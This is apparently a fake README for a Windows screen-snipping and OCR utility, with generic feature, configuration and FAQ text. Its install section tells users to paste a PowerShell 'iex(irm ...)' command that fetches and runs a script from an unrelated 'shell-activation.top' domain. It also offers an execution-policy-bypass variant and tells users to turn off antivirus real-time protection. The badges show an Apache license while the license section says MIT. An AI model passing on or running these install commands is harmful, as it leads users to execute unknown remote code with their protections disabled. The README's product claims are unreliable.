<div align="center">

# Snipping Tool with OCR: Screen Capture & Text Extraction for Windows 11

![preview](https://raw.githubusercontent.com/fishy-max/screen-snip-ocr/main/showcase_eebe.svg)

[![installs](https://img.shields.io/badge/Installs-5.1K-f59e0b?style=flat-square&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Passing-2ea44f?style=flat-square&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.9%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-fbbf24?style=flat-square&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Released-2ea44f?style=flat-square&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Apache--2.0-d97706?style=flat-square&labelColor=0d1117)]()

</div>

---

Snipping-Tool-with-OCR is a desktop utility that captures a user-defined screen region and extracts its textual content through optical character recognition. The application combines an interactive snipping workflow with a Tesseract-based OCR pipeline, converting captured pixel data into machine-readable text. Runtime behavior is governed by an external configuration file, which exposes parameters for OCR interval, log retention limits, debug-mode region-of-interest dumps, multi-display screen selection, and timed capture periods. The codebase supports execution from source within a managed Python environment as well as packaging into a standalone Windows executable via PyInstaller.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Open PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Region-based screen capture for selecting an arbitrary rectangular area of the display and isolating it for processing.
- OCR text extraction performed directly on the captured region, converting the selected pixels into editable, copyable text.
- Multi-monitor support, allowing capture and OCR to be targeted at a specific display via a configurable screen identifier.
- Configurable OCR interval, controlling the time between successive OCR operations per second.
- Bounded log retention through a configurable maximum trace count, preventing unbounded growth of operation history.
- Debug mode that dumps region-of-interest images to disk for inspection and troubleshooting of capture and OCR results.
- Configurable time periods, expressed in seconds, for tuning the cadence of periodic capture and recognition behavior.
- Externalized configuration via a YAML file, enabling adjustment of capture, logging, and OCR parameters without modifying source code.
- Packaging support for producing a standalone Windows executable, bundling application resources, configuration, and OCR data alongside the binary.
- Installer generation path for distributing the application as a standard Windows setup package.

## How It Works

Snipping-Tool-with-OCR operates as a lightweight, event-driven desktop pipeline that couples an interactive region-selection overlay with an OCR engine running in the background. The workflow is divided into capture, preprocessing, recognition, and output stages, each coordinated by the main application loop.

**Capture and region selection**
When the user triggers a capture, the application renders a full-screen translucent overlay on top of the desktop. Mouse press and drag events define a rectangular region of interest (ROI); the overlay visually marks the selection bounds in real time and suppresses the underlying desktop content from receiving input. On release, the ROI coordinates are committed and passed to the capture layer, which grabs only the pixels within that rectangle rather than the entire display. Multi-monitor configurations are handled by resolving the active screen identifier and mapping the overlay geometry to the corresponding display bounds.

**Preprocessing**
The captured bitmap is normalized before recognition to improve accuracy. Depending on the configured options, the image may be converted to grayscale, scaled, or binarized to increase contrast between glyphs and background. This stage isolates the ROI so that only the selected area is processed, which reduces noise from surrounding UI elements and keeps per-capture latency low.

**OCR recognition**
The preprocessed image is handed to the OCR backend, which performs text detection and character recognition and returns a structured result containing the recognized string. Recognition runs off the UI thread so the overlay and controls remain responsive during processing. The engine's language data and working paths are resolved at startup from the application's configuration, allowing the same build to serve different recognition languages without code changes.

**Output and persistence**
Recognized text is presented in the application's result view, where it can be reviewed and copied to the clipboard. Each operation is recorded in a bounded log so recent captures can be revisited; the log length is capped by configuration to prevent unbounded memory growth. Debug mode optionally dumps the ROI images to disk, enabling inspection of exactly what the engine received for each run.

**Configuration-driven behavior**
Runtime parameters — capture interval timing, maximum log length, debug image dumping, target display ID, and time period settings — are read from the configuration file at launch. This keeps operational tuning decoupled from the source, so behavior can be adjusted between deployments without rebuilding the application.

## Compatibility

The application is designed for Microsoft Windows desktop environments and relies on the Windows graphics subsystem for screen capture operations. It targets 64-bit Windows 10 and Windows 11 installations; earlier Windows versions are not supported due to differences in the display capture and window management APIs the snip workflow depends on.

OCR functionality is provided through a locally installed Tesseract OCR engine. The application expects a compatible Tesseract distribution to be present on the host system and configured so that the engine binaries and language data are discoverable at runtime. Language packs determine which scripts can be recognized; only the language data installed alongside the engine is available for text extraction from captured regions.

The runtime is built on Python 3.8. Execution is supported both through a Miniconda-based environment and through a standard Python virtual environment, allowing the application to run in isolated setups without a system-wide interpreter configuration. Each environment is machine-specific, so a fresh environment must be created when deploying to a different device rather than copying an existing one.

Multi-display configurations are supported through an explicit screen selection setting, which identifies the display targeted for capture when more than one monitor is attached. Capture behavior, OCR timing, and region handling are governed by the configuration file, so compatibility with different display layouts and capture intervals can be adjusted without modifying the application itself.

Packaging for distribution is supported via PyInstaller, which produces a standalone executable bundling the application resources, icon assets, configuration file, and OCR language data. The resulting executable runs without a Python installation on the target machine, provided the external OCR engine remains available on the system. Installer generation is likewise supported for producing a conventional Windows setup package for end-user deployment.

## Configuration

Configuration is managed through a YAML configuration file that ships alongside the application. Adjust the parameters below to control capture behavior, OCR processing, and diagnostic output without modifying source code.

- **Capture interval**: Defines the delay between successive OCR operations, expressed in seconds. Lower values increase responsiveness at the cost of higher CPU utilization.
- **Screen identifier**: Specifies which display is targeted when multiple monitors are connected. Set this to the index of the desired screen to direct snipping and OCR to the correct display.
- **Region of interest**: Controls the coordinates and dimensions of the area submitted for text recognition. Accurate bounds reduce processing time and improve recognition accuracy.
- **Debug mode**: When enabled, saves the captured region-of-interest images to disk for inspection. This is useful for verifying framing and troubleshooting recognition issues.
- **Trace limit**: Sets the maximum number of log entries retained during a session. Adjust to balance diagnostic detail against memory usage.
- **Time periods**: Defines the duration, in seconds, of each processing window. Tune this value to align OCR cycles with expected screen activity.
- **OCR language data**: Points to the directory containing the trained language data used by the recognition engine. Ensure the required language files are present before running OCR on non-default languages.

All parameters are optional; omitted values fall back to built-in defaults. After editing the configuration file, restart the application so the changes take effect. Validate modifications incrementally and enable debug mode when diagnosing unexpected capture or recognition results.

## FAQ

**Q: What OCR engine does the application use, and is it bundled?**
A: Text extraction is performed through the Tesseract OCR engine. The engine must be present on the host system for recognition to function; the snipping and region-selection interface itself is part of the application. If recognition returns empty results, verify that the Tesseract binary is on the system path and that the expected language data files are available.

**Q: Which Windows versions are supported?**
A: The application targets 64-bit Windows desktop environments. It relies on a standard desktop capture pipeline and a native OCR installation, so behavior on non-Windows platforms is not part of the supported configuration.

**Q: How does the capture-to-text workflow operate?**
A: The user invokes a snip, drags a rectangular region of interest over the screen, and the cropped image is passed to the OCR engine. The recognized text is then returned to the application for review and reuse. Region coordinates are translated from screen space, so capture remains accurate across the desktop.

**Q: Can I tune recognition behavior without modifying source code?**
A: Yes. Runtime parameters are read from a configuration file, allowing adjustment of capture intervals, trace/log retention limits, debug output of region-of-interest images, target display selection in multi-monitor setups, and timing periods. Changes take effect on the next launch.

**Q: Does the tool support multiple monitors?**
A: Multi-display configurations are supported through a screen identifier setting. Selecting the correct display ensures the snip region maps to the intended monitor rather than the primary desktop.

**Q: What happens to captured images during debugging?**
A: When debug mode is enabled, the application writes the cropped region-of-interest images to disk. This is useful for validating capture boundaries and diagnosing recognition quality; disable it for normal operation to avoid unnecessary file output.

**Q: Is a Python runtime required to run the packaged build?**
A: No. A packaged executable can be produced that embeds the application and its resources, allowing distribution to machines without a Python installation. Building from source, however, requires a configured Python environment with the project dependencies present.

**Q: Why does recognition quality vary between captures?**
A: Accuracy depends on source resolution, contrast, font rendering, and the size of the selected region. Tightly cropping to the text area, avoiding scaling artifacts, and ensuring adequate character height generally improve results.

## License

Snipping-Tool-with-OCR is distributed under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. The full license text is provided in the LICENSE file at the root of the source tree and governs all use of the snipping and OCR functionality, including the screen capture pipeline, OCR engine integration, configuration handling, and generated executables produced from the project. Redistributions of modified builds must retain the original attribution and license notice.